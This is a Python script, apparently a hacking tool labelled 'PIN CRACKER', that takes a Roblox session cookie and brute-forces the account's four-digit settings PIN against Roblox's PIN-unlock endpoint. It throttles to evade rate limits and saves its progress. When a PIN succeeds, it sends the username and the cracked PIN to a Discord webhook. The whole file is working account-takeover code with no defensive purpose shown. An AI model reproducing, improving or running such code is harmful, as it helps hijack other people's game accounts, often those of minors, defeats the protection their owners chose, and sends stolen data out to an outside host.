import requests
import os
import time
import json

def is_cookie_valid(cookie):
    response = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie})
    return response.status_code == 200

def load_progress():
    try:
        with open('progress.json', 'r') as f:
            return json.load(f).get('current_pin', 0)
    except FileNotFoundError:
        return 0

def save_progress(pin):
    with open('progress.json', 'w') as f:
        json.dump({'current_pin': pin}, f)

print('\n\u001B[35m█▀█ █ █▄░█ ▄▄ █▀▀ █▀█ ▄▀█ █▀▀ █▄▀ █▀▀ █▀█\n█▀▀ █ █░▀█ ░░ █▄▄ █▀▄ █▀█ █▄▄ █░█ ██▄ █▀▄\u001B[37m\n================================================\n\t\u001B[31mPIN CRACKER | REMODDED BY: RAISHIN\t\u001B[37m \n================================================')
cookie = input('\u001B[34m[COOKIE]:\u001B[37m ')

if not is_cookie_valid(cookie):
    print("	\u001B[31m[INVALID COOKIE]\u001B[37m")
    exit()

os.system("clear")
webhook = input('\u001B[36m[WEBHOOK]:\u001B[37m ')
pingEveryone = input('PING EVERYONE?: [ y / n ] ').lower()
ping = '@everyone' if pingEveryone in ['y', 'yes'] else 'Pin Successfully Cracked!'
os.system("clear")

print('''[CRACKER STARTED]''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
xcrsf = requests.post('https://auth.roblox.com/v1/login', cookies={".ROBLOSECURITY": cookie}).headers['x-csrf-token']
header = {'X-CSRF-TOKEN': xcrsf}

start_time = time.time()
max_duration = 25 * 24 * 60 * 60
current_pin = load_progress()

for current_pin in range(10000):  
    pin = str(current_pin).zfill(4)  
    payload = {'pin': pin}
    r = requests.post(url, data=payload, headers=header, cookies={".ROBLOSECURITY": cookie})

    if 'unlockedUntil' in r.text:
        print(f'\u001B[32m[SUCCESSFULLY CRACKED] PIN:\u001B[37m  \u001B[34m {pin} \u001B[37m')
        username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie}).json()['name']
        data = {
            "content": ping,
            "username": "Rai$hin - Pin Cracker",
            "avatar_url": "https://cdn.discordapp.com/attachments/1234384385310986241/1302569512192839680/Kokichi_Muta.png?ex=6729e964&is=672897e4&hm=decf67d5cf366b2098e60d6066533e24f54b5eb4cdc6bbe572460f04ac2e6a46&",
            "embeds": [{
                "description": f"{username}'s Pin:\n```{pin}```",
                "title": "Cracked Pin!",
                "color": 0x00ff00,
            }]
        }
        requests.post(webhook, json=data)
        print("Webhook sent successfully.")
        break

    elif 'Too many requests made' in r.text:
        print('Rate limit exceeded. Please wait before trying again.')
        time.sleep(60)

    elif 'Authorization' in r.text:
        print('Error! Is the cookie valid?')
        break

    elif 'Incorrect' in r.text:
        print(f"\u001B[32m[TRIED]:\u001B[37m {pin}, \u001B[31mIncorrect!\u001B[37m")
        time.sleep(10)

    elif 'PIN limit reached' in r.text:
        print("\u001B[31m[PINLIMIT REACHED] You have reached the maximum number of PIN attempts. Please try again later.\u001B[37m")
        break

    save_progress(current_pin) 

end_time = time.time()
print(f"Cracking process completed in {end_time - start_time:.2f} seconds.")
print("\u001B[32m[CRACKER FINISHED]\u001B[37m")
